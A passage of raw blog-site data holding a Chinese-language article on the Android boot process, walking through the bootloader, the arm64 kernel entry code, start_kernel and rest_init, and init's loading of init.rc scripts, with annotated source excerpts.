class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">SecondStageMain</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Epoll epoll;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">auto</span> result = epoll.<span class=\"built_in\">Open</span>(); !result) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">PLOG</span>(FATAL) &lt;&lt; result.<span class=\"built_in\">error</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"built_in\">InstallSignalFdHandler</span>(&amp;epoll);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tActionManager&amp; am = ActionManager::<span class=\"built_in\">GetInstance</span>();</span><br><span class=\"line\">    ServiceList&amp; sm = ServiceList::<span class=\"built_in\">GetInstance</span>();</span><br><span class=\"line\">\t<span class=\"comment\">//加载启动脚本</span></span><br><span class=\"line\">    <span class=\"built_in\">LoadBootScripts</span>(am, sm);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h3><p>init进程是Linux系统中用户空间的第一个进程，进程号固定为1。Kernel启动后，在用户空间启动init进程，并调用init中的main()方法执行init进程的职责。对于init进程的功能为：</p>\n<ul>\n<li>挂载(mount) /sys, /dev 或者/proc等文件</li>\n<li>解析并运行所有的init.rc相关文件</li>\n<li>根据rc文件，生成相应的设备驱动节点</li>\n<li>处理子进程的终止(signal方式)</li>\n<li>提供属性服务的功能</li>\n</ul>\n<h3 id=\"解析启动脚本\"><a href=\"#解析启动脚本\" class=\"headerlink\" title=\"解析启动脚本\"></a>解析启动脚本</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">LoadBootScripts</span><span class=\"params\">(ActionManager&amp; action_manager, ServiceList&amp; service_list)</span> &#123;</span><br><span class=\"line\">    Parser parser = CreateParser(action_manager, service_list);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span> bootscript = GetProperty(<span class=\"string\">&quot;ro.boot.init_rc&quot;</span>, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bootscript.empty()) &#123;</span><br><span class=\"line\">        parser.ParseConfig(<span class=\"string\">&quot;/init.rc&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/system/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/system/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/product/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/product/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/product_services/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/product_services/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/odm/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/odm/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!parser.ParseConfig(<span class=\"string\">&quot;/vendor/etc/init&quot;</span>)) &#123;</span><br><span class=\"line\">            late_import_paths.emplace_back(<span class=\"string\">&quot;/vendor/etc/init&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        parser.ParseConfig(bootscript);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"启动解析的服务\"><a href=\"#启动解析的服务\" class=\"headerlink\" title=\"启动解析的服务\"></a>启动解析的服务</h3><h3 id=\"守护解析的服务\"><a href=\"#守护解析的服务\" class=\"headerlink\" title=\"守护解析的服务\"></a>守护解析的服务</h3><h3 id=\"启动java虚拟机\"><a href=\"#启动java虚拟机\" class=\"headerlink\" title=\"启动java虚拟机\"></a>启动java虚拟机</h3><h3 id=\"预加载资源\"><a href=\"#预加载资源\" class=\"headerlink\" title=\"预加载资源\"></a>预加载资源</h3><h3 id=\"循环等待孵化进程\"><a href=\"#循环等待孵化进程\" class=\"headerlink\" title=\"循环等待孵化进程\"></a>循环等待孵化进程</h3><h3 id=\"启动SystemServer-进程\"><a href=\"#启动SystemServer-进程\" class=\"headerlink\" title=\"启动SystemServer 进程\"></a>启动SystemServer 进程</h3><h3 id=\"创建SystemServer\"><a href=\"#创建SystemServer\" class=\"headerlink\" title=\"创建SystemServer\"></a>创建SystemServer</h3><h3 id=\"管理SystemServer\"><a href=\"#管理SystemServer\" class=\"headerlink\" title=\"管理SystemServer\"></a>管理SystemServer</h3>","site":{"data":{}},"cover":false,"excerpt":"","more":"<h1 id=\"Android-启动流程\"><a href=\"#Android-启动流程\" class=\"headerlink\" title=\"Android 启动流程\"></a>Android 启动流程</h1><p>idle 进程 优先级<br>生成  1 进程init<br>生成 2 进程 system_server</p>\n<p>基于android 10来分析</p>\n<h2 id=\"Boot-ROM\"><a href=\"#Boot-ROM\" class=\"headerlink\" title=\"Boot ROM\"></a>Boot ROM</h2><p>当按下电源键，硬件上电之后，会有一个固定的内存区域读取程序，这个程序是烧写到硬件上的ROM,用于将bootloader加载到RAM中，并开始执行它。</p>\n<h2 id=\"bootloader\"><a href=\"#bootloader\" class=\"headerlink\" title=\"bootloader\"></a>bootloader</h2><p>bootloader用于告诉设备如何找到系统内核，和启动内核。<br>手机厂商一般会在bootloader中加上密钥锁和一些限制.<br>bootloader执行一般分为两个阶段:</p>\n<ul>\n<li><ol>\n<li>检测外部RAM内存,并加载一段bootloader代码用于第二阶段的执行</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>设置运行内核所需要的网络和内存等<br>高通芯片提供的LK,就可以作为一个Android的bootloader.<br>常见的bootloader有:</li>\n</ol>\n</li>\n<li>U-boot</li>\n<li>LK</li>\n</ul>\n<h2 id=\"kernel\"><a href=\"#kernel\" class=\"headerlink\" title=\"kernel\"></a>kernel</h2><p>Android使用的linux kernel,当kernel启动时,会执行一系列的初始化操作,比如设置缓存,内存,加载驱动程序,挂载根文件系统,初始化输入输出等.<br>当内核启动完成之后,第一件要做的事就是在系统文件中找一个“init”,作为根进程或者第一个系统进程.<br>看一下linux kernel的源码,找一个arm64架构开始分析:</p>\n<p>入口在<code>arch/arm64/kernel/head.S</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"> * Kernel startup entry point.</span><br><span class=\"line\"> * ---------------------------</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * The requirements are:</span><br><span class=\"line\"> *   MMU = off, D-cache = off, I-cache = on or off,</span><br><span class=\"line\"> *   x0 = physical address to the FDT blob.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * Note that the callee-saved registers are used for storing variables</span><br><span class=\"line\"> * that are useful before the MMU is enabled. The allocations are described</span><br><span class=\"line\"> * in the entry routines.</span><br><span class=\"line\"> */</span><br><span class=\"line\">\t__HEAD</span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * DO NOT MODIFY. Image header expected by Linux boot-loaders.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tefi_signature_nop\t\t\t// special NOP to identity as PE/COFF executable </span><br><span class=\"line\">\tb\tprimary_entry\t\t\t// branch to kernel start, magic 开始跳转到内核入口</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// Image load offset from start of RAM, little-endian</span><br><span class=\"line\">\tle64sym\t_kernel_size_le\t\t\t// Effective size of kernel image, little-endian</span><br><span class=\"line\">\tle64sym\t_kernel_flags_le\t\t// Informative flags, little-endian</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// reserved</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// reserved</span><br><span class=\"line\">\t.quad\t0\t\t\t\t// reserved</span><br><span class=\"line\">\t.ascii\tARM64_IMAGE_MAGIC\t\t// Magic number</span><br><span class=\"line\">\t.long\t.Lpe_header_offset\t\t// Offset to the PE header.</span><br><span class=\"line\"></span><br><span class=\"line\">\t__EFI_PE_HEADER</span><br><span class=\"line\"></span><br><span class=\"line\">\t.section &quot;.idmap.text&quot;,&quot;a&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * The following callee saved general purpose registers are used on the</span><br><span class=\"line\">\t * primary lowlevel boot path:</span><br><span class=\"line\">\t *</span><br><span class=\"line\">\t *  Register   Scope                      Purpose</span><br><span class=\"line\">\t *  x19        primary_entry() .. start_kernel()        whether we entered with the MMU on</span><br><span class=\"line\">\t *  x20        primary_entry() .. __primary_switch()    CPU boot mode</span><br><span class=\"line\">\t *  x21        primary_entry() .. start_kernel()        FDT pointer passed at boot in x0</span><br><span class=\"line\">\t *  x22        create_idmap() .. start_kernel()         ID map VA of the DT blob</span><br><span class=\"line\">\t *  x23        primary_entry() .. start_kernel()        physical misalignment/KASLR offset</span><br><span class=\"line\">\t *  x24        __primary_switch()                       linear map KASLR seed</span><br><span class=\"line\">\t *  x25        primary_entry() .. start_kernel()        supported VA size</span><br><span class=\"line\">\t *  x28        create_idmap()                           callee preserved temp register</span><br><span class=\"line\">\t */</span><br><span class=\"line\"></span><br><span class=\"line\">SYM_CODE_START(primary_entry) // 是代码的启动入口，这个函数负责在内核启动之前的各种配置</span><br><span class=\"line\">\tbl\trecord_mmu_state  //记录当前 MMU 状态。它读取寄存器 SCTLR_EL1（在 EL1 模式下）或 SCTLR_EL2（在 EL2 模式下）的值，以确定 MMU、缓存等设置是否已开启。</span><br><span class=\"line\">\tbl\tpreserve_boot_args //保存启动参数，以便后续阶段使用。</span><br><span class=\"line\">\tbl\tcreate_idmap //创建恒等映射（identity mapping），即物理地址和虚拟地址一一对应的映射，以确保在 MMU 关闭的情况下代码可以执行。</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * If we entered with the MMU and caches on, clean the ID mapped part</span><br><span class=\"line\">\t * of the primary boot code to the PoC so we can safely execute it with</span><br><span class=\"line\">\t * the MMU off.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tcbz\tx19, 0f</span><br><span class=\"line\">\tadrp\tx0, __idmap_text_start</span><br><span class=\"line\">\tadr_l\tx1, __idmap_text_end</span><br><span class=\"line\">\tadr_l\tx2, dcache_clean_poc</span><br><span class=\"line\">\tblr\tx2</span><br><span class=\"line\">0:\tmov\tx0, x19</span><br><span class=\"line\">\tbl\tinit_kernel_el\t\t\t// w0=cpu_boot_mode</span><br><span class=\"line\">\tmov\tx20, x0</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * The following calls CPU setup code, see arch/arm64/mm/proc.S for</span><br><span class=\"line\">\t * details.</span><br><span class=\"line\">\t * On return, the CPU will be ready for the MMU to be turned on and</span><br><span class=\"line\">\t * the TCR will have been set.</span><br><span class=\"line\">\t */</span><br><span class=\"line\">#if VA_BITS &gt; 48</span><br><span class=\"line\">\tmrs_s\tx0, SYS_ID_AA64MMFR2_EL1</span><br><span class=\"line\">\ttst\tx0, ID_AA64MMFR2_EL1_VARange_MASK</span><br><span class=\"line\">\tmov\tx0, #VA_BITS</span><br><span class=\"line\">\tmov\tx25, #VA_BITS_MIN</span><br><span class=\"line\">\tcsel\tx25, x25, x0, eq</span><br><span class=\"line\">\tmov\tx0, x25</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\tbl\t__cpu_setup\t\t\t// initialise processor</span><br><span class=\"line\">\tb\t__primary_switch</span><br><span class=\"line\">SYM_CODE_END(primary_entry)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>SYM_CODE_START(primary_entry) 宏解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define ASM_NL ;</span><br><span class=\"line\">#define SYM_L_GLOBAL(name) .globl name</span><br><span class=\"line\"></span><br><span class=\"line\">#define SYM_CODE_START(name) \\</span><br><span class=\"line\">\tSYM_START(name, SYM_L_GLOBAL , SYM_A_ALIGN)</span><br><span class=\"line\"></span><br><span class=\"line\">#define SYM_START(name, linkage, align...) \\</span><br><span class=\"line\">\tSYM_ENTRY(name,linkage,align)</span><br><span class=\"line\"></span><br><span class=\"line\">#define SYM_ENTRY(name,linkage,align...) \\</span><br><span class=\"line\">\tlinkage(name) ASM_NL \\</span><br><span class=\"line\">\talign ASM_NL \\</span><br><span class=\"line\">\tname:</span><br><span class=\"line\">#解析为:</span><br><span class=\"line\">.globl primary_entry;</span><br><span class=\"line\">.balign 4; </span><br><span class=\"line\">primary_entry:</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SYM_FUNC_START_LOCAL(__primary_switch)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tldr\tx8, =__primary_switched</span><br><span class=\"line\">\tadrp\tx0, KERNEL_START\t\t// __pa(KERNEL_START)</span><br><span class=\"line\">\tbr\tx8</span><br><span class=\"line\">\t...</span><br><span class=\"line\">SYM_FUNC_END(__primary_switch)</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"> * The following fragment of code is executed with the MMU enabled.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> *   x0 = __pa(KERNEL_START)</span><br><span class=\"line\"> */</span><br><span class=\"line\">SYM_FUNC_START_LOCAL(__primary_switched)</span><br><span class=\"line\">\tadr_l\tx4, init_task</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tmov\tx0, x20</span><br><span class=\"line\">\tbl\tfinalise_el2\t\t\t// Prefer VHE if possible</span><br><span class=\"line\">\tldp\tx29, x30, [sp], #16</span><br><span class=\"line\">\tbl\tstart_kernel</span><br><span class=\"line\">\tASM_BUG()</span><br><span class=\"line\">SYM_FUNC_END(__primary_switched)</span><br></pre></td></tr></table></figure>\n<p>初始化会执行到__primary_switched,再执行start_kernel,start_kernel是内核C代码的入口<br>这个时候“0号”进程“swapper”(一个Idle进程)已经启动了(init_task.c中调用).</p>\n<ul>\n<li>启动内核<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 声明：inlude/linux/start_kernel.h</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> asmlinkage <span class=\"type\">void</span> __init __noreturn <span class=\"title function_\">start_kernel</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">asmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//实现：init/main.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">start_kernel</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tarch_call_rest_init();</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __init __weak __noreturn <span class=\"title function_\">arch_call_rest_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">\trest_init();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">rest_init 函数的职责包括：</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t1.\t启动 init 进程，使其获得 PID 1。</span></span><br><span class=\"line\"><span class=\"comment\">\t2.\t启动 kthreadd 内核线程管理进程，负责管理所有的内核线程。</span></span><br><span class=\"line\"><span class=\"comment\">\t3.\t将系统状态设置为 SYSTEM_SCHEDULING，表明系统已经完成启动并准备好调度。</span></span><br><span class=\"line\"><span class=\"comment\">\t4.\t最终将 CPU 置于空闲状态。</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">noinline <span class=\"type\">void</span> _ref __noreturn <span class=\"title function_\">rest_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> pid;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpid = user_mode_thread(kernel_init,<span class=\"literal\">NULL</span>,CLONE_FS);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">user_mode_thread 通过创建一个新的线程并切换到用户模式，完成了从内核空间向用户空间的过渡。这个过程需要配置和设置特定的寄存器、栈以及状态，以确保新线程可以在用户模式下正常运行。</span></span><br><span class=\"line\"><span class=\"comment\">1.\tinit 进程必须是用户态进程：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t在 Linux 系统中，init 进程（PID 1）是第一个用户态进程。所有用户态进程都是直接或间接从 init 派生的。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tinit 进程通常负责启动用户空间的初始化脚本和守护进程，建立用户空间环境。因此，init 必须以用户态运行。</span></span><br><span class=\"line\"><span class=\"comment\">2.\tkernel_init 的任务是启动用户空间应用：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tkernel_init 函数的作用是完成一些内核启动后的收尾工作，然后启动用户态的 /sbin/init 或者其他指定的初始化程序，以此开始加载用户态进程和服务。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t通过 user_mode_thread 进入用户模式执行 kernel_init，使得它可以顺利地过渡到用户空间，并启动用户态程序。\t</span></span><br><span class=\"line\"><span class=\"comment\">3.\t安全性和隔离性：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t将 kernel_init 放在用户模式运行可以将其与内核空间隔离。这种设计符合 Linux 内核的安全模型，使用户空间和内核空间隔离，避免了对内核资源的意外或恶意操作。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t用户态进程的错误（如非法访问内存）不会影响到内核本身的稳定性，而是被限制在用户空间。</span></span><br><span class=\"line\"><span class=\"comment\">4.\t切换到用户态是 Linux 启动流程的必要步骤：</span></span><br><span class=\"line\"><span class=\"comment\">\t•\tLinux 的启动流程分为内核初始化和用户空间初始化两个主要阶段。rest_init 调用 user_mode_thread 生成一个用户态进程，这标志着内核的初始化阶段已经完成，系统从内核态过渡到用户态。</span></span><br><span class=\"line\"><span class=\"comment\">\t•\t这一步完成后，内核将主要作为用户空间进程的支持系统，不会主动执行其他任务，除非通过系统调用、异常或中断进入内核。</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**kernel_init 函数的主要目标是执行用户空间的 init 程序（通常是 /sbin/init），从而让系统进入多用户操作模式，并为用户空间进程提供运行环境。*/</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __ref <span class=\"title function_\">kernel_init</span><span class=\"params\">(<span class=\"type\">void</span> *unused)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Wait until kthreadd is all set-up.</span></span><br><span class=\"line\"><span class=\"comment\">\t•\twait_for_completion 等待 